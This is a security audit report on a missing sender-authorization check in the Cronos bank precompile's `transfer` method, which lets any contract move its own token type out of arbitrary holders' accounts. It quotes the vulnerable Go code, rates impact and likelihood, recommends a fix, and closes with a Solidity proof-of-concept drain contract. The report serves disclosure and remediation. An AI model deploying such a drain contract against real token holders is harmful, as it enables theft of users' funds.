### Title
Missing Sender Authorization in Bank Precompile `transfer` — Arbitrary Drain of `evm/<caller>` Token Holders - (File: x/cronos/keeper/precompiles/bank.go)

---

### Summary

The `TransferMethodName` case in `BankContract.Run` accepts an attacker-supplied `sender` address and calls `bankKeeper.SendCoins(ctx, from, to, ...)` without ever verifying that `sender == contract.Caller()`. Any contract can therefore drain the `evm/<callerContract>` native-bank balance of any account that holds those tokens.

---

### Finding Description

In the `transfer` branch of `Run`:

```go
sender    := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)   // fully attacker-controlled
...
from  := sdk.AccAddress(sender.Bytes()) // no check vs contract.Caller()
denom := EVMDenom(contract.Caller())    // "evm/0x<callerContract>"
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

The denom is correctly scoped to `contract.Caller()` (so a contract can only move its own token type), but the **source account** (`from`) is taken verbatim from the ABI input with no guard. There is no check of the form:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the caller")
}
```

Compare with `mint`/`burn`, where the denom is also `EVMDenom(contract.Caller())` — the caller is implicitly the authority over its own token supply. The `transfer` path breaks this model by letting the caller debit **any** account. [2](#0-1) 

The reference integration-test contract (`TestBank.sol`) shows the intended usage — passing `msg.sender` as the sender — but this is a convention, not an enforcement:

```solidity
return bank.transfer(msg.sender, recipient, amount);
``` [3](#0-2) 

Nothing in the precompile enforces that convention.

---

### Impact Explanation

A malicious contract can:

1. Mint `evm/<MaliciousContract>` tokens to users (legitimately, as a DeFi/token-issuer contract).
2. At any later time call `bank.transfer(victimAddress, attackerAddress, victimBalance)` — the precompile executes `SendCoins` from the victim to the attacker with no victim consent.

This is an **unauthorized transfer of precompile-controlled assets**, matching the Critical impact criterion: *"Unauthorized … transfer … for … precompile-controlled assets."*

The `BankKeeper.SendCoins` interface used here performs no additional authorization check beyond what the caller provides: [4](#0-3) 

---

### Likelihood Explanation

- Requires only deploying a contract and calling it — fully unprivileged.
- No leaked keys, admin access, or external assumptions needed.
- The exploit is a single EVM call; it is deterministic and locally testable.

---

### Recommendation

Enforce that the `sender` argument equals `contract.Caller()` before executing the transfer:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the caller contract")
    }
    ...
``` [5](#0-4) 

Alternatively, remove the `sender` argument entirely and always debit `contract.Caller()`, consistent with how `mint`/`burn` implicitly scope authority to the caller.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract AttackerContract {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: give victim some evm/<this> tokens (simulates normal usage)
    function setupVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim without their consent
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim, but caller = address(this) — no authorization check
        bank.transfer(victim, attacker, amount);
    }
}
```

**Test assertion:**
- Before `drain`: victim holds `N` units of `evm/<AttackerContract>`, attacker holds `0`.
- After `drain`: victim holds `0`, attacker holds `N`.
- The precompile succeeds with no revert. [6](#0-5) 

---

**IBC / denom-trace note:** The question's "channel provenance" angle does not add a separate attack surface here. The denom `evm/<caller>` is not an IBC voucher and the `transfer` path involves no IBC channel or packet logic. The sole root cause is the missing `sender == contract.Caller()` guard.
